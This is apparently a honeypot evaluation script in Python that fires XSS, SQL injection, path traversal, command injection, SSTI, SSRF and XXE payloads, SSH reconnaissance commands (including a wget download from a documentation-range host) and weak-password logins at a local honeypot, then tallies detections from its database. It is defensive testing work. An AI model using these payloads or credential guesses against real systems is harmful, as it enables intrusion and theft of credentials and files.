#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""端到端攻击流量验收：真实请求进入 Web / SSH 蜜罐，再用数据库核对。

用途：
  1. 向 Web 蜜罐发送 5 类攻击 + 正常对照（带唯一 X-Honeypot-Eval 标记）；
  2. 用真实 SSH 会话执行命令并完成一次 SCP 上传；
  3. 追加若干 SSH 弱口令失败，验证暴力破解事件；
  4. 从 SQLite 反查 raw_request / event_log，统计规则与 AI 融合结果。

仅访问 127.0.0.1 本机蜜罐；X-Forwarded-For 使用 RFC 5737 文档保留网段，
不指向任何真实主机。
"""
from __future__ import annotations

import argparse
import json
import socket
import sqlite3
import sys
import time
from collections import Counter, defaultdict
from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parents[1]
DB = ROOT / "database" / "event_logs.db"

WEB = "http://127.0.0.1:5000"
IP_POOL = ["203.0.113.17", "203.0.113.45", "203.0.113.99",
           "198.51.100.23", "198.51.100.77",
           "192.0.2.31", "192.0.2.88", "192.0.2.200"]
BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36")


def web_cases():
    """(family, label, method, path, query, body, headers, is_attack)"""
    cases = []

    def add(family, label, method, path, query="", body="", headers=None, is_attack=True):
        h = {"User-Agent": BROWSER_UA}
        h.update(headers or {})
        cases.append((family, label, method, path, query, body, h, is_attack))

    # ---- XSS ----
    add("xss", "script 标签", "GET", "/search", "q=<script>alert(document.cookie)</script>")
    add("xss", "img onerror", "GET", "/search", "q=<img src=x onerror=alert(1)>")
    add("xss", "svg onload", "GET", "/search", "q=<svg/onload=alert(1)>")
    add("xss", "URL 编码", "GET", "/search", "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
    add("xss", "javascript 伪协议", "GET", "/search", "q=javascript:alert(1)//")

    # ---- SQLi ----
    add("sqli", "UNION 查询", "GET", "/products", "id=1 UNION SELECT username,password FROM users")
    add("sqli", "or 1=1", "GET", "/products", "id=1' OR '1'='1")
    add("sqli", "注释截断", "GET", "/products", "id=admin'--")
    add("sqli", "时间盲注", "GET", "/products", "id=1 AND SLEEP(5)")
    add("sqli", "URL 编码", "GET", "/products", "id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users")

    # ---- 目录穿越 ----
    add("path_traversal", "etc/passwd", "GET", "/page", "file=../../../../etc/passwd")
    add("path_traversal", "URL 编码", "GET", "/page", "file=..%2F..%2F..%2Fetc%2Fpasswd")
    add("path_traversal", "Windows 路径", "GET", "/page", "file=..\\..\\..\\windows\\win.ini")
    add("path_traversal", "绕过写法", "GET", "/page", "file=....//....//etc/passwd")

    # ---- 敏感文件 / 后台 ----
    add("sensitive_path", ".env", "GET", "/.env")
    add("sensitive_path", ".git/config", "GET", "/.git/config")
    add("sensitive_path", "dump.sql", "GET", "/dump.sql")
    add("sensitive_path", "备份包", "GET", "/backup.zip")
    add("sensitive_path", "旧后台", "GET", "/admin_v2/login")

    # ---- 扫描器指纹 ----
    add("scanner", "sqlmap UA", "GET", "/", headers={"User-Agent": "sqlmap/1.8.7#stable (https://sqlmap.org)"})
    add("scanner", "Nikto UA", "GET", "/", headers={"User-Agent": "Nikto/2.1.6"})
    add("scanner", "Nmap UA", "GET", "/", headers={"User-Agent": "Mozilla/5.0 (Nmap Scripting Engine)"})

    # ---- 命令注入 ----
    add("command_injection", "分号拼接", "GET", "/tools", "cmd=127.0.0.1;cat /etc/passwd")
    add("command_injection", "$() 执行", "GET", "/tools", "cmd=$(whoami)")
    add("command_injection", "管道", "GET", "/tools", "cmd=127.0.0.1|id")

    # ---- SSTI ----
    add("ssti", "双花括号", "GET", "/search", "name={{7*7}}")
    add("ssti", "美元表达式", "GET", "/search", "name=${7*7}")
    add("ssti", "JSP 表达式", "GET", "/search", "name=<%= 7*7 %>")

    # ---- SSRF ----
    add("ssrf", "云元数据", "GET", "/api/preview", "url=http://169.254.169.254/latest/meta-data/")
    add("ssrf", "file 协议", "GET", "/api/preview", "url=file:///etc/passwd")
    add("ssrf", "内网管理端", "GET", "/api/preview", "url=http://127.0.0.1:5001/")

    # ---- XXE ----
    for label in ("外部实体读取", "参数实体", "SYSTEM 关键字"):
        body = ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                '"file:///etc/passwd">]><foo>&xxe;</foo>')
        add("xxe", label, "POST", "/api/preview", "", body,
            {"Content-Type": "application/xml"}, True)

    # ---- 正常对照 ----
    add("benign", "首页", "GET", "/", is_attack=False)
    add("benign", "关于页", "GET", "/about", is_attack=False)
    add("benign", "产品列表", "GET", "/products", is_attack=False)
    add("benign", "新闻详情", "GET", "/news", "id=1", is_attack=False)
    add("benign", "正常搜索", "GET", "/search", "q=python+tutorial", is_attack=False)
    add("benign", "方案页", "GET", "/solutions", is_attack=False)
    return cases


def send_web(cases, run_id, gap):
    marker = {"X-Honeypot-Eval": run_id, "Accept-Language": "zh-CN,zh;q=0.9"}
    results = []
    for index, (family, label, method, path, query, body, headers, is_attack) in enumerate(cases, 1):
        ip = IP_POOL[(index - 1) % len(IP_POOL)]
        h = dict(headers)
        h.update(marker)
        h["X-Honeypot-Case"] = f"{run_id}-{index:02d}"
        h["X-Forwarded-For"] = ip
        url = WEB + path + (("?" + query) if query else "")
        started = time.perf_counter()
        status = None
        error = ""
        try:
            if method == "POST":
                resp = requests.post(url, data=body.encode("utf-8"), headers=h, timeout=20)
            else:
                resp = requests.get(url, headers=h, timeout=20)
            status = resp.status_code
        except Exception as exc:  # noqa: BLE001
            error = f"{type(exc).__name__}: {exc}"
        latency = (time.perf_counter() - started) * 1000
        results.append({
            "index": index, "family": family, "label": label, "method": method,
            "path": path, "query": query, "ip": ip, "status": status,
            "latency_ms": round(latency, 1), "error": error,
            "expected_attack": is_attack, "marker": run_id,
        })
        print(f"[web {index:02d}] {family:17s} {label:14s} -> {status} ({latency:.0f} ms) {ip}")
        time.sleep(gap)
    return results


def _recv_all(channel, timeout=1.0):
    channel.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = channel.recv(4096)
            if not data:
                break
            chunks.append(data)
            if len(b"".join(chunks)) > 65536:
                break
    except Exception:
        pass
    return b"".join(chunks).decode("utf-8", "replace")


def send_ssh(host, port, user, password, run_id):
    import paramiko
    records = []
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=password,
                       timeout=8, look_for_keys=False, allow_agent=False)
        records.append({"action": "login", "status": "success"})
        print("[ssh] 登录成功")
        commands = [
            "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /root",
            "ps aux", "ip addr", "crontab -l", "wget http://203.0.113.9/x.sh",
            "demo_unknown_cmd",
        ]
        for command in commands:
            _stdin, stdout, _stderr = client.exec_command(command, timeout=10)
            output = stdout.read().decode("utf-8", "replace")
            records.append({"action": "cmd", "command": command,
                            "status": "ok", "output_preview": output[:200]})
            print(f"[ssh] $ {command:32s} -> {output.splitlines()[0][:60] if output.strip() else '(empty)'}")
            time.sleep(0.25)

        # SCP 上传：直接实现 scp -t 协议，服务端会落入 scp_upload 事件
        transport = client.get_transport()
        channel = transport.open_session(timeout=10)
        channel.exec_command("scp -t /tmp")
        time.sleep(0.4)
        ack = channel.recv(1024)
        file_name = "attack_sample.sh"
        content = b"#!/bin/sh\necho honeypot-scp-test\nid\n"
        channel.sendall(f"C0644 {len(content)} {file_name}\n".encode())
        time.sleep(0.3)
        _ = channel.recv(1024)
        channel.sendall(content + b"\x00")
        time.sleep(0.3)
        _ = channel.recv(1024)
        channel.sendall(b"\x01")
        time.sleep(0.3)
        channel.close()
        records.append({"action": "scp_upload", "file": file_name, "status": "sent",
                        "size": len(content), "ack": ack[:20].hex()})
        print(f"[ssh] SCP 上传 {file_name} ({len(content)} bytes)")
    except Exception as exc:  # noqa: BLE001
        records.append({"action": "ssh_error", "status": "error", "error": repr(exc)})
        print(f"[ssh] 失败: {exc!r}")
    finally:
        try:
            client.close()
        except Exception:
            pass

    # 弱口令失败：5 次，低于默认 12 次封禁阈值，只产生失败事件
    for user_name, pwd in [("admin", "123456"), ("oracle", "oracle"),
                           ("test", "test"), ("guest", "guest"), ("ftpuser", "ftpuser")]:
        try:
            probe = paramiko.SSHClient()
            probe.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            probe.connect(host, port=port, username=user_name, password=pwd,
                          timeout=5, look_for_keys=False, allow_agent=False)
            probe.close()
            records.append({"action": "login_failed_case", "user": user_name, "status": "unexpected_success"})
        except Exception as exc:  # noqa: BLE001
            records.append({"action": "login_failed_case", "user": user_name,
                            "status": "auth_failed", "error": type(exc).__name__})
            print(f"[ssh] 弱口令失败 {user_name}/{pwd}")
        time.sleep(0.35)
    return records


def query_db(run_id):
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    rows = cur.execute(
        "SELECT id, src_ip, method, path, query_string, headers, is_suspicious, "
        "threat_score, create_time "
        "FROM raw_request WHERE headers LIKE ? ORDER BY id",
        (f"%{run_id}%",),
    ).fetchall()
    raws = [dict(r) for r in rows]
    ids = [r["id"] for r in raws]
    events = []
    if ids:
        marks = ",".join("?" for _ in ids)
        events = [dict(r) for r in cur.execute(
            "SELECT id,timestamp,source,severity,event_type,src_ip,raw_request_id,"
            "substr(payload,1,180) AS payload, extra FROM event_log "
            f"WHERE raw_request_id IN ({marks}) ORDER BY id", ids).fetchall()]
    conn.close()
    return raws, events


def wait_for_rows(run_id, expected, timeout=25.0):
    deadline = time.time() + timeout
    last = -1
    while time.time() < deadline:
        try:
            conn = sqlite3.connect(DB)
            count = conn.execute(
                "SELECT COUNT(*) FROM raw_request WHERE headers LIKE ?",
                (f"%{run_id}%",),
            ).fetchone()[0]
            conn.close()
        except Exception:
            count = -1
        if count != last:
            print(f"[db] 已落库 {count}/{expected} 条 Web 请求")
            last = count
        if count >= expected:
            return count
        time.sleep(1.0)
    return last


def summarize(web_results, ssh_records, run_id):
    raws, events = query_db(run_id)
    raw_by_case = {}
    for raw in raws:
        try:
            headers = json.loads(raw.get("headers") or "{}")
        except Exception:
            headers = {}
        case_key = str(headers.get("X-Honeypot-Case") or "")
        if case_key:
            raw_by_case[case_key] = raw
    event_by_raw = {}
    for event in events:
        event_by_raw.setdefault(event.get("raw_request_id"), []).append(event)

    per_family = defaultdict(lambda: {"total": 0, "logged": 0, "suspicious": 0,
                                      "events": 0, "ai_applied": 0, "ai_points": 0})
    details = []
    for result in web_results:
        raw = raw_by_case.get(f"{run_id}-{result['index']:02d}")
        family = result["family"]
        stat = per_family[family]
        stat["total"] += 1
        detail = dict(result)
        if raw:
            stat["logged"] += 1
            detail["raw_request_id"] = raw["id"]
            detail["threat_score"] = raw["threat_score"]
            detail["is_suspicious"] = bool(raw["is_suspicious"])
            if raw["is_suspicious"]:
                stat["suspicious"] += 1
            related = event_by_raw.get(raw["id"], [])
            if related:
                stat["events"] += 1
                detail["event_ids"] = [e["id"] for e in related]
                detail["event_types"] = [e["event_type"] for e in related]
                try:
                    extra = json.loads(related[0].get("extra") or "{}")
                except Exception:
                    extra = {}
                ai = extra.get("ai") or {}
                detail["final_source"] = extra.get("final_source")
                detail["ai_points"] = extra.get("ai_points") or ai.get("ai_points")
                detail["ai_type"] = ai.get("attack_type") if isinstance(ai, dict) else None
                if extra.get("ai_applied") or (isinstance(ai, dict) and ai.get("is_attack")):
                    stat["ai_applied"] += 1
                try:
                    stat["ai_points"] += int(detail.get("ai_points") or 0)
                except Exception:
                    pass
        else:
            detail["raw_request_id"] = None
        details.append(detail)

    attack = {k: v for k, v in per_family.items() if k != "benign"}
    benign = per_family.get("benign", {"total": 0, "suspicious": 0, "events": 0})
    total_attack = sum(v["total"] for v in attack.values())
    total_susp = sum(v["suspicious"] for v in attack.values())
    total_events = sum(v["events"] for v in attack.values())
    total_ai = sum(v["ai_applied"] for v in attack.values())
    return {
        "run_id": run_id,
        "web": {
            "attack_requests": total_attack,
            "attack_logged": sum(v["logged"] for v in attack.values()),
            "attack_suspicious": total_susp,
            "attack_events": total_events,
            "attack_ai_applied": total_ai,
            "benign_requests": benign["total"],
            "benign_suspicious": benign["suspicious"],
            "benign_events": benign["events"],
            "by_family": dict(per_family),
        },
        "raw_requests": raws,
        "events": events,
        "details": details,
        "ssh": ssh_records,
    }


def main(argv=None):
    parser = argparse.ArgumentParser()
    parser.add_argument("--run-id", default=time.strftime("ai_eval_%Y%m%d_%H%M%S"))
    parser.add_argument("--gap", type=float, default=0.45)
    parser.add_argument("--ssh-user", default="root")
    parser.add_argument("--ssh-password", default="root123")
    parser.add_argument("--skip-ssh", action="store_true")
    parser.add_argument("--output", default="")
    args = parser.parse_args(argv)

    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8", errors="replace")

    print(f"运行标记: {args.run_id}")
    print("=" * 78)

    cases = web_cases()
    web_results = send_web(cases, args.run_id, args.gap)
    ssh_records = []
    if not args.skip_ssh:
        print("-" * 78)
        ssh_records = send_ssh("127.0.0.1", 2222, args.ssh_user,
                               args.ssh_password, args.run_id)
    wait_for_rows(args.run_id, len(web_results))
    report = summarize(web_results, ssh_records, args.run_id)

    print("=" * 78)
    web = report["web"]
    print(f"Web 攻击请求 {web['attack_requests']}，落库 {web['attack_logged']}，"
          f"可疑 {web['attack_suspicious']}，事件 {web['attack_events']}，"
          f"AI 参与 {web['attack_ai_applied']}")
    print(f"正常对照 {web['benign_requests']}，可疑 {web['benign_suspicious']}，"
          f"事件 {web['benign_events']}")
    print("-" * 78)
    print(f"{'家族':18s} {'总数':>4s} {'落库':>4s} {'可疑':>4s} {'事件':>4s} {'AI参与':>6s} {'AI分':>5s}")
    for family, stat in web["by_family"].items():
        print(f"{family:18s} {stat['total']:4d} {stat['logged']:4d} {stat['suspicious']:4d} "
              f"{stat['events']:4d} {stat['ai_applied']:6d} {stat['ai_points']:5d}")
    print(f"SSH 记录 {len(ssh_records)} 条")

    output = Path(args.output) if args.output else ROOT / "reports" / f"attack_eval_{args.run_id}.json"
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"结果已写入: {output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
